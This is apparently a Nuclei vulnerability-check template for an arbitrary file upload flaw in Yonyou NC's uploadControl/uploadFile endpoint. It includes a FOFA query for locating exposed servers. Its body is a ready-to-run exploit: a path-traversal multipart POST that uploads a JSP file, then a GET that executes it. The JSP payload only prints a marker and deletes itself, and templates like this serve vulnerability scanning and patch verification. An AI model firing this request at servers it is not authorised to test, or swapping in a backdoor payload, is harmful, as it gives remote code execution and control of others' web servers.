id: yongyouNC-uploadControl-uploadFile-File-upload

info:
  name: 用友 NC uploadControl/uploadFile 文件上传
  author: unknown
  severity: high
  description: |-
    fofa: icon_hash="1085941792"
    用友 NC uploadControl/uploadFile 接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139666069
  tags: File upload
  
http:
  - raw:
    - |
      @timeout: 30s
      POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
      Connection: close
      Content-Length: 373

      ------WebKitFormBoundarygcflwtei
      Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
      Content-Type: image/jpeg

      <% out.println("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundarygcflwtei
      Content-Disposition: form-data; name="submit"

      上传
      ------WebKitFormBoundarygcflwtei--
    - |+
      @timeout: 30s
      GET /mp/uploadFileDir/{{filename}}.jsp HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36


    max-redirects: 3
    matchers-condition: and
    matchers:
        - type: dsl
          dsl:
            - 'status_code_1 == 200'
            - 'status_code_2 == 200'
            - 'contains(body_2, "HelloWorldTest")'  
          condition: and